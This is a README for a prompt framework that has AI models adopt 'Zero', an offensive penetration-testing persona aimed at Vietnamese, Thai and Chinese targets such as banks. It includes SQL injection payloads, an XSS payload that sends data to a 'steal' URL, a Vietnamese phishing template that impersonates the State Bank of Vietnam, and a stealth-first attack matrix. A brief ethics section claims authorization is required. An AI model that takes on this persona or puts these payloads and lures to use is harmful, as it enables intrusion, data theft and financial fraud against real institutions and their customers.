# Dragon-V Prompt & Policy Framework (DVPPF) v2.0

> 专业级AI提示词与决策知识库 - 亚洲地区渗透测试专家系统

## 📚 项目概述

Dragon-V Prompt & Policy Framework (DVPPF) 是一个专门为亚洲地区渗透测试设计的专业级AI提示词与决策知识库。这个框架通过结构化的心智模型、决策策略和技术战术，为AI提供深度专业化的思维模式。

### 🎯 核心特色

- **专业级身份塑造**: AI以Dragon-V顶级专家'Zero'的身份进行思考和决策
- **亚洲地区优化**: 特别针对中国、越南、泰国等亚洲地区的网络环境和文化特点
- **结构化知识库**: 分层设计的知识体系，便于维护和扩展
- **智能模板系统**: 可复用的场景化模板库，支持快速构建专业指令
- **决策框架指导**: 完整的决策策略和行动指南

## 📁 文件结构

```
dvppf_knowledge_base/
├── 1_core_philosophy.md          # 核心哲学与心智模型
├── 2_decision_policies.yaml      # 决策策略与行动框架
├── 3_tactical_library.md         # 战术技术库
├── 4_asian_target_templates.md    # 亚洲目标专用模板
├── 5_ai_loader.py                # 智能加载器
└── README.md                     # 项目文档
```

## 🧠 框架架构

### 1. 分层设计 (Layered Design)

#### 🏗️ 层级1: 角色与哲学 (Identity & Philosophy)
- **身份认同**: Dragon-V顶级渗透测试专家'Zero'
- **世界观**: 网络是战场、知识就是力量、简约至上
- **伦理准则**: 授权第一、无损原则、保密协议

#### 🎯 层级2: 决策与策略 (Decision & Strategy)
- **新目标发现**: 被动OSINT、攻击面映射、漏洞情报收集
- **漏洞验证**: 多向量验证、隐蔽性技术、成功标准
- **利用选择**: 场景优化、决策矩阵、权衡分析
- **数据提取**: 优先级排序、格式化处理、完整性验证

#### 🔧 层级3: 战术与技术 (Tactics & Technology)
- **SQL注入**: 亚洲地区编码适配、WAF绕过、多语言支持
- **XSS攻击**: 多语言混淆、社会工程学结合、反检测技术
- **文件上传**: 条件竞争、解析漏洞利用、多语言WebShell
- **社会工程学**: 亚洲文化特点、语言优化、权威模仿

#### 📋 层级4: 模板与范例 (Templates & Examples)
- **侦查模板**: 地区化目标侦察、技术栈识别、攻击面映射
- **利用模板**: 漏洞特定利用、防御绕过、持久化访问
- **数据提取模板**: 多格式输出、完整性验证、地区适配

### 2. 知识库格式 (Knowledge Base Format)

#### 📝 Markdown + YAML
- **Markdown**: 人类可读的解释和说明
- **YAML**: 机器可解析的结构化数据
- **代码块**: 包含具体的实现代码和示例

#### 🌐 多语言支持
- **中文**: 支持中文字符编码、本地化表达
- **越南语**: 越南语术语、本地化策略
- **泰语**: 泰语表达、文化适配

## 🚀 快速开始

### 安装要求

```bash
# Python 3.6+
pip install pyyaml requests

# 确保知识库文件存在
ls dvppf_knowledge_base/
```

### 基本使用

#### 1. 命令行使用
```bash
# 侦查模板
python dvppf_knowledge_base/5_ai_loader.py \
    --template recon_template \
    --target "example.com" \
    --region vietnam \
    --priority high

# 利用模板
python dvppf_knowledge_base/5_ai_loader.py \
    --template exploit_template \
    --target "target.com" \
    --region thailand \
    --priority medium
```

#### 2. Python API使用
```python
from dvppf_knowledge_base.ai_loader import DVPPLoader

# 初始化加载器
loader = DVPPLoader()

# 构建AI提示
context = {
    'template_type': 'recon_template',
    'target_name': 'Vietnamese Bank',
    'region': 'vietnam',
    'priority': 'high'
}

ai_prompt = loader.build_ai_prompt('recon_template', context)
print(ai_prompt)
```

### AI协作模式

#### 🤖 AI指令生成器
```python
# --- AI协作启动器 ---
// 你是Dragon-V CyberSec Labs的专家'Zero'
// 经验: 15年渗透测试经验，特别专精东南亚地区
// 任务: 请基于上述模板和上下文，提供专业的技术方案
```

#### 📋 标准输出格式
```
=== AI协作指令 ===
[完整的AI提示词内容]

=== 执行报告 ===
[详细的执行报告信息]

---
*提示由Dragon-V Prompt & Policy Framework (DVPPF) v2.0生成*
```

## 🌏 亚洲地区特色

### 1. 越南地区优化
- **语言支持**: 完整的越南语术语和表达
- **文化适配**: 理解越南企业的层级结构和社会关系
- **时区利用**: 利用越南时区(GMT+7)创造监控盲期
- **技术特点**: 识别越南常见的CMS和框架

### 2. 泰国地区优化
- **语言支持**: 泰语技术术语和本地化表达
- **文化理解**: 深入理解泰国商业文化和决策流程
- **技术特点**: 针对泰国流行的Web应用进行优化
- **社会工程学**: 利用泰国文化特点进行信息收集

### 3. 中国地区优化
- **语言支持**: 中文编码处理和术语标准化
- **法规合规**: 了解中国网络安全法规和合规要求
- **技术特点**: 针对中国企业技术栈进行定制化
- **监管环境**: 适应中国地区的监管环境

## 🔧 技术能力

### 1. 漏洞检测技术
```python
# SQL注入 - 亚洲地区优化
vietnamese_sql_injection = {
    'comment': '-- Nhận xét đây',
    'delays': "WAITFOR DELAY '0:0:3' -- Thời gian chờ",
    'payloads': ["username='admin'/**/AND/**/1=1/**/--/**/Nhận xét"]
}

# XSS攻击 - 多语言支持
vietnamese_xss = {
    'reflected': ["<script>alert('XSS Việt Nam')</script>"],
    'stored': ["<script>fetch('https://dragon-v-vn.com/steal')</script>"]
}
```

### 2. 社会工程学技术
```python
# 越南语钓鱼邮件
vietnamese_phishing = {
    'subject': 'Thông báo bảo mật tài khoản ngân hàng',
    'authority': 'Ngân hàng Nhà nước Việt Nam',
    'emotional_triggers': ['Sợ hãi', 'Đáng tin cậy']
}
```

### 3. 数据提取技术
```python
# 多语言数据处理
multilingual_data = {
    'chinese': {'pattern': r'[\u4e00-\u9fff]+'},
    'vietnamese': {'pattern': r'[A-Za-zÀ-ỹà-ỹ\s]+'},
    'thai': {'pattern': r'[\u0E00-\u0E7F]+'}
}
```

## 📊 决策框架

### 1. 目标发现策略
```yaml
on_new_target_discovered:
  action: "stealth_investigation"
  steps:
    - "passive_osint": "使用被动OSINT技术"
    - "attack_surface_mapping": "攻击面映射"
    - "vulnerability_reconnaissance": "漏洞情报收集"
    - "social_engineering_analysis": "社会工程学分析"
```

### 2. 漏洞验证策略
```yaml
on_vulnerability_verification:
  action: "multi_vector_validation"
  strategies:
    - "primary_validation": "直接漏洞利用测试"
    - "secondary_validation": "间接证据收集"
    - "tertiary_validation": "多维度交叉验证"
```

### 3. 利用选择策略
```yaml
on_exploitation_choice:
  action: "scenario_optimization"
  optimization_matrix:
    "financial_system":
      priority: "极高"
      techniques: ["SQL注入", "文件上传", "会话劫持"]
      success_rate: "75%"
```

## 🎯 最佳实践

### 1. 模板使用原则
- **选择合适模板**: 根据任务类型选择相应的模板
- **上下文适配**: 根据具体目标调整上下文变量
- **地区优化**: 选择对应地区的特定模板
- **优先级设置**: 根据任务重要性设置合适优先级

### 2. AI协作技巧
- **专业身份强化**: 始终以'Zero'的身份进行协作
- **地区文化理解**: 充分利用地区文化特点
- **技术栈识别**: 针对性选择技术手段
- **隐蔽性保证**: 优先考虑隐蔽性和成功率

### 3. 知识库维护
- **定期更新**: 根据新的威胁和技术更新内容
- **版本控制**: 使用Git进行版本管理和跟踪
- **反馈优化**: 根据实际使用效果优化模板
- **团队协作**: 鼓励团队贡献和知识共享

## 🛡️ 安全与伦理

### 1. 授权要求
- **书面授权**: 所有操作必须有明确、书面、可验证的授权
- **范围控制**: 严格控制在授权范围内
- **责任明确**: 对每一步操作都承担责任

### 2. 损害控制
- **无害原则**: 除非明确授权，所有操作都必须是可逆的
- **最小影响**: 选择对目标业务影响最小的攻击路径
- **证据保护**: 避免破坏证据链，确保漏洞可追溯

### 3. 合规要求
- **法律遵守**: 遵守相关法律法规
- **道德准则**: 保持最高的职业道德标准
- **隐私保护**: 保护个人隐私和数据安全

## 🔮 未来发展

### 1. 扩展计划
- **更多地区支持**: 增加马来西亚、新加坡、印尼等地区支持
- **AI模型集成**: 集成大型语言模型的API调用
- **自动化工具**: 开发自动化的渗透测试工具
- **培训体系**: 建立专业培训认证体系

### 2. 技术演进
- **机器学习集成**: 使用机器学习优化攻击策略
- **威胁情报整合**: 集成实时的威胁情报数据
- **自动化决策**: 实现更智能的自动化决策系统
- **可视化界面**: 开发友好的可视化用户界面

## 🤝 贡献指南

### 1. 贡献方式
- **模板提交**: 提交新的场景化模板
- **技术更新**: 更新最新的攻击技术和防御绕过方法
- **地区扩展**: 添加新的地区支持
- **文档改进**: 改进文档质量和用户体验

### 2. 贡献规范
- **格式统一**: 遵循统一的格式和结构
- **质量保证**: 确保内容的准确性和专业性
- **版本管理**: 遵循Git工作流程
- **测试验证**: 对所有修改进行充分测试

## 📞 联系我们

- **项目主页**: https://github.com/dragon-v/dvppf
- **技术支持**: security@dragon-v.com
- **商务合作**: business@dragon-v.com
- **Bug报告**: https://github.com/dragon-v/dvppf/issues

---

## 📄 许可证

本项目遵循 MIT 许可证 - 详见 [LICENSE](LICENSE) 文件

## 🙏 致谢

感谢所有为Dragon-V项目做出贡献的安全专家和研究人员。特别感谢在亚洲地区网络安全研究方面做出卓越贡献的研究者们。

---

**Dragon-V Prompt & Policy Framework v2.0**
*专业级的AI提示词与决策知识库 - 为亚洲地区网络安全而生*